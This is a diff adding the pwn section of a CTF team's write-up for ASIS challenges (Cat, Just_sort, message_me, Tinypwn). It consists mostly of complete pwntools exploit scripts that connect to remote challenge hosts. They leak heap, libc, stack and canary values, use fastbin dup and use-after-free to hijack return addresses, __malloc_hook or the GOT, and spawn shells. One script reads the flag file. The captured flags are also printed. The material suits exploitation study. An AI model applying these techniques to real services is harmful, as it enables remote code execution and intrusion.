@@ -15,6 +15,10 @@
      - [Left or Right? (sces60107)](#left-or-right-sces60107)
      - [Density (sces60107)](#density-sces60107)
    - [pwn](#pwn)
+     - [Cat (kevin47)](#cat-kevin47)
+     - [Just_sort (kevin47)](#just_sort-kevin47)
+     - [message_me (kevin47)](#message_me-kevin47)
+     - [Tinypwn (kevin47)](#tinypwn-kevin47)
    - [PPC](#ppc)
      - [Neighbour (lwc)](#neighbour-lwc)
      - [The most Boring (how2hack)](#the-most-boring-how2hack)
@@ -555,6 +559,317 @@ output=newinput.decode("base64")
 Now you know how to reconstruct the flag.
 The flag is `ASIS{01d_4Nd_GoLD_ASIS_1De4_4H4t_g0e5_f0r_ls!}`
 ## pwn
+
+### Cat (kevin47)
+
+* I am a idiot that can't think, so I used the most hardcore way :)
+* Use name and kind to leak heap, libc, stack, canary
+* fastbin dup attack to stack twice in order to overwrite return address
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+from IPython import embed
+import re
+
+context.arch = 'amd64'
+
+r = remote('178.62.40.102', 6000)
+
+def create(name, kind, age, nonl=0, stack=''):
+    if name == '':
+        r.recvrepeat(1)
+    if stack:
+        r.send(stack)
+    else:
+        r.send('0001')
+    if name == '':
+        r.sendlineafter('>', '')
+        r.sendlineafter('>', '')
+    else:
+        r.send(name.ljust(0x16, '\x00'))
+        r.send(kind.ljust(0x16, '\x00'))
+    r.send(str(age).rjust(4, '0'))
+
+def edit(idx, name, kind, age, modify, sp=1):
+    r.send('0002')
+    r.send(str(idx).rjust(4, '0'))
+    if sp:
+        r.recvrepeat(1)
+        r.sendline(name)
+        r.sendlineafter('>', kind)
+    else:
+        r.send(name.ljust(0x16, '\x00'))
+        r.send(kind.ljust(0x16, '\x00'))
+    r.send(str(age).rjust(4, '0'))
+    r.send(modify.ljust(4, '\x00'))
+
+def print_one(idx):
+    r.recvrepeat(2)
+    r.send('0003')
+    r.sendlineafter('>', str(idx))
+    return r.recvuntil('---', drop=True)
+
+def delete(idx):
+    r.send('0005')
+    r.send(str(idx).rjust(4, '0'))
+
+create('a'*0x10, 'a'*0x10, 1)
+create('a'*0x10, 'a'*0x10, 1)
+#create('a'*0x10, 'a'*0x10, 1)
+create(flat(0, 0x21), flat(0, 0x21), 1)
+create('a'*0x10, 'a'*0x10, 1)
+create('a'*0x10, 'a'*0x10, 1)
+create('a'*0x10, 'a'*0x10, 1)
+delete(4)
+delete(5)
+# set ptr
+edit(0, 'b', 'b', 2, 'n')
+create('', '', 1)
+edit(0, 'b', 'b', 2, 'n', sp=1)
+x = print_one(4)
+xx = re.findall('kind: (.*)\nold', x)[0]
+heap = u64(xx.ljust(8, '\x00')) - 0x180
+print 'heap:', hex(heap)
+create('a', flat(heap+0x10, heap+0x70), 1)
+edit(0, 'b', 'b', 2, 'n')
+
+create(flat(0x602010), 'a', 1)
+x = print_one(0)
+xx = re.findall('name: (.*)\nkind', x)[0]
+#libc = u64(xx.ljust(8, '\x00')) - 0x3a6870
+libc = u64(xx.ljust(8, '\x00')) - 0x3e1870
+print 'libc:', hex(libc)
+
+delete(6)
+#environ = libc + 0x38bf98
+environ = libc + 0x3c6f38
+create(flat(heap+0x10, heap+0x30), flat(environ, heap+0x30), 1)
+x = print_one(0)
+xx = re.findall('name: (.*)\nkind', x)[0]
+stack = u64(xx.ljust(8, '\x00'))
+print 'stack', hex(stack)
+
+delete(6)
+canary_addr = stack - 0x100 + 1
+create(flat(canary_addr, heap+0x30), flat(heap+0x10, heap+0x30), 1)
+x = print_one(0)
+xx = re.findall('name: (.*)\nkind', x)[0]
+canary = u64('\x00'+xx[:7])
+print 'canary:', hex(canary)
+
+# switch order
+delete(6)
+create(flat(heap+0x10, heap+0x30), flat(heap+0x10, heap+0x30), 1)
+
+edit(0, 'b', 'b', 2, 'n')
+delete(1)
+
+fake_pos = stack-0x11f
+print 'fake_pos:', hex(fake_pos)
+create(flat(fake_pos), 'a', 1)
+# fake chunk on stack
+create(flat(heap+0x1b0, heap+0x210), '\x00'*7+flat(0x2100), 1, stack='1\x21\x00\x00')
+
+# puts address on heap
+delete(3)
+create(flat(fake_pos+0x10), flat(fake_pos+0x10), 1)
+
+# reset fastbin
+delete(4)
+delete(0)
+
+create(flat(heap+0x160), 'b', 1,)
+#raw_input("@")
+magic = libc + 0xf1147
+print 'magic:', hex(magic)
+r.recvrepeat(1)
+r.sendline('1')
+r.sendlineafter('>', 'AAAA')
+r.sendafter('>', flat(canary>>8)[:-1]+flat(0, magic))
+r.sendlineafter('>', '6')
+sleep(1)
+r.sendline('ls /home/pwn; cat /home/pwn/flag')
+
+#embed()
+r.interactive()
+
+# ASIS{5aa9607cca34dba443c2b757a053665179f3f85c}
+```
+
+### Just_sort (kevin47)
+
+* Simple overflow and UAF problem
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+from IPython import embed
+from ctypes import *
+import re
+
+context.arch = 'amd64'
+
+r = remote('159.65.125.233', 6005)
+
+def insert(n, s):
+    r.sendlineafter('>', '1')
+    r.sendlineafter('>', str(n))
+    r.sendafter('>', s)
+
+def edit(h, p, s):
+    r.sendlineafter('>', '2')
+    r.sendlineafter('>', str(h))
+    r.sendlineafter('>', str(p))
+    r.sendafter('>', s)
+
+def printt():
+    r.sendlineafter('>', '3')
+    return r.recvuntil('---', drop=True)
+
+def search(n, s):
+    r.sendlineafter('>', '4')
+    r.sendlineafter('>', str(n))
+    r.sendafter('>', s)
+
+def delete(h, p):
+    r.sendlineafter('>', '5')
+    r.sendlineafter('>', str(h))
+    r.sendlineafter('>', str(p))
+
+insert(10, 'a')
+insert(10, 'b')
+delete(1, 0)
+search(10, flat(
+    [0]*3, 0x21,
+    [0]*3, 0x21,
+    0, 0x602018,
+))
+x = printt()
+xx = re.findall('0: "(.*)"', x)[0]
+libc = u64(xx.ljust(8, '\x00')) - 0x844f0
+print 'libc:', hex(libc)
+system = libc+0x45390
+edit(1, 0, flat(system))
+insert(40, '/bin/sh\x00')
+delete(4, 0)
+
+
+r.interactive()
+# ASIS{67d526ef0e01f2f9bdd7bff3829ba6694767f3d1}
+```
+
+### message_me (kevin47)
+
+* UAF
+* hijack __malloc_hook with fastbin dup attack
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+from IPython import embed
+from ctypes import *
+import re
+
+context.arch = 'amd64'
+
+#r = remote('127.0.0.1', 7124)
+r = remote('159.65.125.233', 6003)
+
+def add(sz, content):
+    r.sendlineafter('choice : ', '0')
+    r.sendlineafter('size : ', str(sz))
+    r.sendlineafter('meesage : ', content)
+
+def remove(idx):
+    r.sendlineafter('choice : ', '1')
+    r.sendlineafter('message : ', str(idx))
+
+def show(idx):
+    r.sendlineafter('choice : ', '2')
+    r.sendlineafter('message : ', str(idx))
+    return r.recvuntil('----', drop=True)
+
+def change(idx):
+    r.sendlineafter('choice : ', '3')
+    r.sendlineafter('message : ', str(idx))
+
+add(0x100-0x10, 'a')    # 0
+add(100-0x10, 'a')      # 1
+add(0x100-0x10, 'a')    # 2
+add(100-0x10, 'a')      # 3
+add(0x100-0x10, 'a')    # 4
+add(100-0x10, 'a')      # 5
+remove(0)
+remove(2)
+remove(4)
+x = show(2)
+xx = re.findall('Message : (.*)\n   Message', x, re.DOTALL)[0]
+heap = u64(xx.ljust(8, '\x00')) - 0x2e0
+x = show(4)
+xx = re.findall('Message : (.*)\n   Message', x, re.DOTALL)[0]
+libc = u64(xx.ljust(8, '\x00')) - 0x3c4c68
+print 'heap:', hex(heap)
+print 'libc:', hex(libc)
+
+# fastbin dup
+clib = CDLL("libc.so.6")
+clib.srand(1)
+__malloc_hook = libc + 0x3c4aed
+#__malloc_hook = 0x602005
+magic = libc + 0xf02a4
+print 'magic:', hex(magic)
+add(0x70-0x10, flat(    # 6
+    0x71,
+))
+add(0x70-0x10, flat(0x71, __malloc_hook))     # 7
+remove(6)
+remove(7)
+remove(6)
+# 6's fd += 0x10
+change(6)
+change(6)
+change(6)
+add(0x70-0x10, flat(0xdeadbeef))
+add(0x70-0x10, flat(0xdeadbeef))
+add(0x70-0x10, '\x00'*3+flat(0, magic))
+
+# trigger malloc_printerr
+remove(0)
+remove(0)
+#r.sendlineafter('choice : ', '0')
+#r.sendlineafter('size : ', '100')
+
+r.interactive()
+# ASIS{321ba5b38c9e4db97c5cc995f1451059b4e28f6a}
+```
+
+### Tinypwn (kevin47)
+
+* Use the syscall execveat
+
+```python2
+#!/usr/bin/env python2
+
+from pwn import *
+from IPython import embed
+from ctypes import *
+import re
+
+context.arch = 'amd64'
+
+#r = remote('127.0.0.1', 7124)
+r = remote('159.65.125.233', 6009)
+
+r.send('/bin/sh\x00'.ljust(296)+flat(0x4000ed)+'\x00'*18)
+
+r.interactive()
+
+# ASIS{9cea1dd8873d688649e7cf738dade84a33a508fb}
+```
 
 ## PPC
 
